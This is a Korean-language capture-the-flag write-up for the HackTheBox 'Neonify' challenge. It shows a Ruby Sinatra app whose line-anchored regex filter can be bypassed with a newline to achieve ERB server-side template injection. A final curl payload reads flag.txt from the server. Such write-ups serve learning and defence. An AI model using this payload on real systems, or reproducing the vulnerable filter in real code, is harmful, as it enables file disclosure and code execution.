# Neonify
![js](https://img.shields.io/badge/Ruby-CC342D?style=for-the-badge&logo=ruby&logoColor=white)

## 개요
 - HackTheBox Ruby로 이루어진 SSTI 문제입니다.
 - 정규표현식으로 이루어진 필터링으로인하여 모든 특수문자가 제한되 푸는데 어려움이 있는문제입니다.
 - 정규표현식 테스팅사이트를 통하여 직접 문제를 풀면 좋을것같습니다.

## Preview
<img width="1430" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/94d97616-929d-4e8d-945e-9d9dcef5ee9b">

## Source
 - neon.rb
```
class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end
```

 - index.erb
```
<!DOCTYPE html>
<html>
<head>
    <title>Neonify</title>
    <link rel="stylesheet" href="stylesheets/style.css">
    <link rel="icon" type="image/gif" href="/images/gem.gif">
</head>
<body>
    <div class="wrapper">
        <h1 class="title">Amazing Neonify Generator</h1>
        <form action="/" method="post">
            <p>Enter Text to Neonify</p><br>
            <input type="text" name="neon" value="">
            <input type="submit" value="Submit">
        </form>
        <h1 class="glow"><%= @neon %></h1>
    </div>
</body>
</html>
```

## 시나리오
 - 먼저 취약점이 터지는부분의 코드를 확인
```
<h1 class="glow"><%= @neon %></h1>
```
 - 해당 코드를 확인하면 ```erb``` 웹 템플릿 엔진을 활용한것을 확인할수있다.
 - erb에 관련하여 ssti공격이 가능하다는것을 문서를 통하여 알수있었고
<img width="1092" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/46671c4c-5792-4df1-9b6c-c396f5a0ddea">
 - 우리는 flag.txt를 불러와 read()를 하면 파일의 내용을 블랙리스트가 없단 가정하에 냐용을 출력받을수있다..
 - 2번째로는 ```neon.rb```를 확인해보았을때 neon의 인자값을 받는곳에 정규표현식을 사용하여 사용자의 입력값을 검증을 거친다는것이다.
```
post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end
```
 - 살펴보면 neon의 변수에 0~9의 숫자와 a~z까지의 문자만 대소문자 구분없이 입력받을수있다. 다른 특수문자가 들어가게된다면 정규표현식을 거칠수없어 neon의 변수는 ```Malicious Input Detected``` 해당 문자열들로 초기화된다.
 - 여기서 ```https://rubular.com/``` 라는 루비 정규표현식 매치 사이트를 이용하여 해당 언어의 정규표현식 검증을 우회할방법을 탐색하다가 찾은것이 아래의 내용이다
<img width="1470" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/6f04b26a-210e-4d6a-9e70-5ecb1634a75a">
 - 해당 내용을보면 erb 템플릿을 사용하여 정규표현식으로 필터링을 거칠때 한줄만 받는것같았다. ```enter```를 통하여 다음줄에 입력값을 넣게되면 정규표현식을 bypass할수있다.

## payload
```
curl -d 'neon=aaaa%0A%3C%25%3D%20File.open(%27flag.txt%27).read%20%25%3E' [ip:port]
```
<img width="834" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/b6f7f6c1-6c33-4807-b744-b34c19a3ae64">
